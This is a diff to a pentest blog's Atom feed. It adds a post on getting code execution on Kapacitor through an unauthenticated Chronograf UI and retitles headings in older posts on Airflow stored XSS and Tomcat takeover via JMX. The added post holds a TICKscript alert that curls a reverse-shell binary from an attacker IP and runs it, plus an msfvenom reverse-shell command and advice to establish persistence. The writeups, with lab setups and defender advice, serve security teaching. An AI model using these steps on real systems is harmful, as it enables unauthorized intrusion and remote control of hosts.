@@ -1,14 +1,116 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-17T10:12:19-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">-pentest notes-</title><subtitle>some security-related notes from the field, hopefully of use to other attackers/defenders...</subtitle><entry><title type="html">cve-2019-0216: stored xss in apache airflow</title><link href="http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss.html" rel="alternate" type="text/html" title="cve-2019-0216: stored xss in apache airflow" /><published>2020-06-16T00:00:00-06:00</published><updated>2020-06-16T00:00:00-06:00</updated><id>http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss</id><content type="html" xml:base="http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss.html">&lt;h1 id=&quot;motivation&quot;&gt;motivation&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-17T21:51:50-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">-pentest notes-</title><subtitle>some security-related notes from the field, hopefully of use to other attackers/defenders...</subtitle><entry><title type="html">TICK Stack: Getting Kapacitor Shells via Chronograf</title><link href="http://localhost:4000/network-pentest/2020/06/17/kapacitor-shells-via-chronograph.html" rel="alternate" type="text/html" title="TICK Stack: Getting Kapacitor Shells via Chronograf" /><published>2020-06-17T00:00:00-06:00</published><updated>2020-06-17T00:00:00-06:00</updated><id>http://localhost:4000/network-pentest/2020/06/17/kapacitor-shells-via-chronograph</id><content type="html" xml:base="http://localhost:4000/network-pentest/2020/06/17/kapacitor-shells-via-chronograph.html">&lt;h1 id=&quot;motivation&quot;&gt;Motivation&lt;/h1&gt;
+
+&lt;p&gt;Depending on the devops culture of the teams you’re consulting with, you may come across the &lt;a href=&quot;https://www.influxdata.com/time-series-platform/&quot;&gt;TICK stack&lt;/a&gt; during an engagement. The TICK stack is a set of tools which makes metrics collection, system monitoring, and alerting easy for deployments. It’s also yet another set of tools which ships with no authentication by the default.&lt;/p&gt;
+
+&lt;p&gt;If you find an open Chronograf instance (default listening port is 8888), you may be able to abuse it to gain code execution on a related stack component (Kapacitor). The execution may happen on the Chronograf host itself, or a network-connected Kapacitor host, depending on the configuration.&lt;/p&gt;
+
+&lt;h1 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h1&gt;
+
+&lt;p&gt;You’ve found an open Chronograf instance (no-auth by default), or you’ve obtained credentials to one.&lt;/p&gt;
+
+&lt;p&gt;At the time of writing this technique works against the latest Chronograph/Kapacitor versions.&lt;/p&gt;
+
+&lt;h1 id=&quot;exploiting&quot;&gt;Exploiting&lt;/h1&gt;
+
+&lt;p&gt;Depending on what you have access to in the network, Kapacitor has an &lt;a href=&quot;https://docs.influxdata.com/kapacitor/v1.5/working/api/&quot;&gt;HTTP API&lt;/a&gt;, which we could use to script this attack directly (port 9092 is the default if you’re looking for Kapacitor instances), though in this post I’ll show how to get a shell via the Chronograf gui.&lt;/p&gt;
+
+&lt;p&gt;Once in the Chronograph web ui, click on the ‘Alerts -&amp;gt; Manage Alerts’ page in the left navigation bar&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/screens/kapacitor-chronograf-view.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;From here, you can create a new ‘TICKscript’&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/screens/kapacitor-write-tickscript.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;… paste in an appropriate &lt;a href=&quot;/downloadable/kapacitor-tickscript&quot;&gt;payload&lt;/a&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/screens/kapacitor-select-db-and-save.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;choose a database and save the script. This &lt;a href=&quot;/dowloadable/kapacitor-tickscript&quot;&gt;example payload&lt;/a&gt; operates against the built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_internal&lt;/code&gt; database, and should execute the code if there are more than 0 measurements in the database.&lt;/p&gt;
+
+&lt;p&gt;The key section of the &lt;a href=&quot;/downloadable/kapacitor-tickscript&quot;&gt;script&lt;/a&gt; is the alert which executes code on the host (here, curling out to the attacker on 172.21.0.1:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var trigger = data
+    |alert()
+        .crit(lambda: &quot;value&quot; &amp;gt; crit)
+        .message(message)
+        .id(idVar)
+        .idTag(idTag)
+        .levelTag(levelTag)
+        .messageField(messageField)
+        .durationField(durationField)
+        .exec('curl', '172.21.0.1/reverse-shell', '-o', '/tmp/reverse-shell')
+        .exec('chmod', '+x', '/tmp/reverse-shell')
+        .exec('/tmp/reverse-shell')
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once the script has been saved the alert becomes active and will execute every 10 seconds (under the default config). I’d recommend getting a shell, establishing persistence, and then removing the malicious alert.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/screens/kapacitor-payload-executes.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;try-it-out&quot;&gt;Try it out&lt;/h1&gt;
+
+&lt;p&gt;The following should work on a UNIX system with docker and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jq&lt;/code&gt; installed.&lt;/p&gt;
+
+&lt;p&gt;Run this bash script to kick off a simulated influx-kapacitor-chronograf setup:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# saved as start.sh in examples&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;netcheck&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;docker network list | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;influxdb&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$netcheck&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+	&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;creating influxdb docker network&quot;&lt;/span&gt;
+	docker network create influxdb
+&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# generate a default kapacitor config&lt;/span&gt;
+docker run &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; kapacitor  kapacitord config &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; kapacitor.conf
+
+&lt;span class=&quot;c&quot;&gt;# start influx db on the influxdb network&lt;/span&gt;
+docker run &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;influxdb &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;influxdb influxdb
+
+&lt;span class=&quot;c&quot;&gt;# start up kapacitor&lt;/span&gt;
+docker run &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 9092:9092 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;kapacitor &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;--net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;influxdb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;KAPACITOR_INFLUXDB_0_URLS_0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://influxdb:8086 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+    kapacitor
+
+&lt;span class=&quot;c&quot;&gt;# chronograph (ui) pointed at right endpoints&lt;/span&gt;
+docker run &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 8888:8888 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;--net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;influxdb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;chronograf &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+      chronograf &lt;span class=&quot;nt&quot;&gt;--influxdb-url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://influxdb:8086 &lt;span class=&quot;nt&quot;&gt;--kapacitor-url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http://kapacitor:9092
+
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;setup finished. Network is laid out as&quot;&lt;/span&gt;
+docker network inspect influxdb | jq &lt;span class=&quot;s1&quot;&gt;'.[].Containers[] | .Name + &quot;: &quot; + .IPv4Address'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/screens/kapacitor-network-start.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Generate a reverse shell with msfvenom changing IPs as necessary:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom  &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;172.21.0.1 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9999 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; elf &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; reverse-shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Set up a quick web server for the chronograf instance to grab the reverse-shell binary.&lt;/p&gt;
+
+&lt;p&gt;Navigate to the chronograf endpoint and run the attack steps (remember to sub in the correct IP in the TICKscript).&lt;/p&gt;
+
+&lt;h1 id=&quot;if-youre-defending&quot;&gt;If You’re Defending&lt;/h1&gt;
+
+&lt;p&gt;The usual advice applies here - don’t let developers run administrative services on your network without authentication required (or if they REALLY must, try to firewall off the access as much as you can).&lt;/p&gt;</content><author><name></name></author><summary type="html">Motivation</summary></entry><entry><title type="html">CVE-2019-0216: Stored XSS in Apache Airflow</title><link href="http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss.html" rel="alternate" type="text/html" title="CVE-2019-0216: Stored XSS in Apache Airflow" /><published>2020-06-16T00:00:00-06:00</published><updated>2020-06-16T00:00:00-06:00</updated><id>http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss</id><content type="html" xml:base="http://localhost:4000/network-pentest/2020/06/16/cve-2019-0216-airflow-stored-xss.html">&lt;h1 id=&quot;motivation&quot;&gt;Motivation&lt;/h1&gt;
 
 &lt;p&gt;A while back I (and several other researchers concurrently) reported CVE-2019-0216 to Apache – a stored XSS in Apache Airflow. Airflow is a workflow orchestration platform, and isn’t uncommon to come across on an engagement. If you find an older installation there is a fun opportunity for getting stored XSS.&lt;/p&gt;
 
-&lt;h1 id=&quot;prerequisites&quot;&gt;prerequisites&lt;/h1&gt;
+&lt;h1 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h1&gt;
 
 &lt;p&gt;If the installation is out-of-date (&amp;lt; 1.10.3 according to Apache), it is theoretically vulnerable (though I can’t currently reproduce against manual out-of-date installs from PyPI due to some severe dependency drift). In any case, Airflow suffered from this vulnerability in late February 2019 when it was reported to Apache.&lt;/p&gt;
 
 &lt;p&gt;Additionally, the CVE describes the vuln as being possibly exploited by a ‘malicious admin’, which is technically true, however auth is disabled by default. So if auth has been enabled, you’ll need credentials to perform the attack.&lt;/p&gt;
 
-&lt;h1 id=&quot;exploiting&quot;&gt;exploiting&lt;/h1&gt;
+&lt;h1 id=&quot;exploiting&quot;&gt;Exploiting&lt;/h1&gt;
 
 &lt;p&gt;Visit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin/dagrun/&lt;/code&gt; endpoint (by default not password protected).&lt;/p&gt;
 
@@ -49,15 +151,15 @@
 
 &lt;p&gt;At this point you can drop your favorite xss payload. Depending on the state of the airflow installation (there could be many, many DAGs) you can also hide your payloads throughout rows below the page fold to be less obvious.&lt;/p&gt;
 
-&lt;h1 id=&quot;if-youre-defending&quot;&gt;if you’re defending&lt;/h1&gt;
+&lt;h1 id=&quot;if-youre-defending&quot;&gt;If You’re Defending&lt;/h1&gt;
 
-&lt;p&gt;These kinds of issues are best prevented by a good scanning + patching cadence and basic password hygiene (like enabling authentication, and requiring strong passwords).&lt;/p&gt;</content><author><name></name></author><summary type="html">motivation</summary></entry><entry><title type="html">exploiting apache tomcat via jmx</title><link href="http://localhost:4000/network-pentest/2020/06/15/exploit-tomcat-via-jmx.html" rel="alternate" type="text/html" title="exploiting apache tomcat via jmx" /><published>2020-06-15T00:00:00-06:00</published><updated>2020-06-15T00:00:00-06:00</updated><id>http://localhost:4000/network-pentest/2020/06/15/exploit-tomcat-via-jmx</id><content type="html" xml:base="http://localhost:4000/network-pentest/2020/06/15/exploit-tomcat-via-jmx.html">&lt;h1 id=&quot;motivation&quot;&gt;motivation&lt;/h1&gt;
+&lt;p&gt;These kinds of issues are best prevented by a good scanning + patching cadence and basic password hygiene (like enabling authentication, and requiring strong passwords).&lt;/p&gt;</content><author><name></name></author><summary type="html">Motivation</summary></entry><entry><title type="html">Exploiting Apache Tomcat via JMX</title><link href="http://localhost:4000/network-pentest/2020/06/15/exploit-tomcat-via-jmx.html" rel="alternate" type="text/html" title="Exploiting Apache Tomcat via JMX" /><published>2020-06-15T00:00:00-06:00</published><updated>2020-06-15T00:00:00-06:00</updated><id>http://localhost:4000/network-pentest/2020/06/15/exploit-tomcat-via-jmx</id><content type="html" xml:base="http://localhost:4000/network-pentest/2020/06/15/exploit-tomcat-via-jmx.html">&lt;h1 id=&quot;motivation&quot;&gt;Motivation&lt;/h1&gt;
 
 &lt;p&gt;Often on internal network pentests, you’ll come across an Apache Tomcat server. Usually access to the manager endpoint is restricted by network controls (requiring localhost access for example), but sometimes it’s left open.&lt;/p&gt;
 
 &lt;p&gt;If you find yourself unable to brute-force common tomcat default credentials, there may still be an avenue to exploit the server.&lt;/p&gt;
 
-&lt;h1 id=&quot;prerequisites&quot;&gt;prerequisites&lt;/h1&gt;
+&lt;h1 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h1&gt;
 
 &lt;p&gt;The following configs are peculiar, but I’ve seen them in the wild:&lt;/p&gt;
 
@@ -67,7 +169,7 @@
   &lt;li&gt;the tomcat user database is writable&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h1 id=&quot;why-not-just-exploit-jmx&quot;&gt;why not just exploit jmx?&lt;/h1&gt;
+&lt;h1 id=&quot;why-not-just-exploit-jmx&quot;&gt;Why Not Just Exploit JMX?&lt;/h1&gt;
 
 &lt;p&gt;Good question! Abusing a no-auth JMX/RMI endpoint is easy with metasploit, however there are cases when the payloads aren’t working (classloader issues, host configuration weirdness, network limitations, etc.):&lt;/p&gt;
 
@@ -94,7 +196,7 @@
 
 &lt;p&gt;… Or maybe you’re avoiding metasploit entirely and want to backdoor the server by hand? If you find yourself in this scenario getting in as an authenticated user is really easy without any special tooling.&lt;/p&gt;
 
-&lt;h1 id=&quot;reconfiguring-the-server&quot;&gt;reconfiguring the server&lt;/h1&gt;
+&lt;h1 id=&quot;reconfiguring-the-server&quot;&gt;Reconfiguring the Server&lt;/h1&gt;
 
 &lt;p&gt;Connecting to the server via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jconsole&lt;/code&gt; we can execute some Tomcat-specific methods to let ourselves in.&lt;/p&gt;
 
@@ -129,7 +231,7 @@
 
 &lt;p&gt;At this point we can get code-execution via the typical malicious .war upload, as detailed lots of places. &lt;a href=&quot;https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/&quot;&gt;Here&lt;/a&gt; for example.&lt;/p&gt;
 
-&lt;h1 id=&quot;try-it-out&quot;&gt;try it out&lt;/h1&gt;
+&lt;h1 id=&quot;try-it-out&quot;&gt;Try it out&lt;/h1&gt;
 
 &lt;p&gt;If you’d like to experiment with this, below is a Dockerfile which will spin up a tomcat server in the vulnerable configuration.&lt;/p&gt;
 
@@ -143,6 +245,6 @@ docker run -p 8888:8888 -p 8080:8080 t8
 
 &lt;p&gt;Here’s the &lt;a href=&quot;/downloadable/tomcat/Dockerfile&quot;&gt;Dockerfile&lt;/a&gt;.&lt;/p&gt;
 
-&lt;h1 id=&quot;if-youre-defending&quot;&gt;if you’re defending&lt;/h1&gt;
+&lt;h1 id=&quot;if-youre-defending&quot;&gt;If You’re Defending&lt;/h1&gt;
 
-&lt;p&gt;The heart of this attack lies in JMX. Developers often assume the JMX endpoints have no security implications and they copy+paste JVM args disabling authentication on them. Watch your network for no-auth JMX endpoints, and yell loudly if you find them. Unfortunately there aren’t very standard ports to look for, so you may need to try to detect them in deployment configs, or heavily firewall off non-standard ports so that a developer trying to expose one would trigger a change request and paper trail of some sort.&lt;/p&gt;</content><author><name></name></author><summary type="html">motivation</summary></entry></feed>
+&lt;p&gt;The heart of this attack lies in JMX. Developers often assume the JMX endpoints have no security implications and they copy+paste JVM args disabling authentication on them. Watch your network for no-auth JMX endpoints, and yell loudly if you find them. Unfortunately there aren’t very standard ports to look for, so you may need to try to detect them in deployment configs, or heavily firewall off non-standard ports so that a developer trying to expose one would trigger a change request and paper trail of some sort.&lt;/p&gt;</content><author><name></name></author><summary type="html">Motivation</summary></entry></feed>
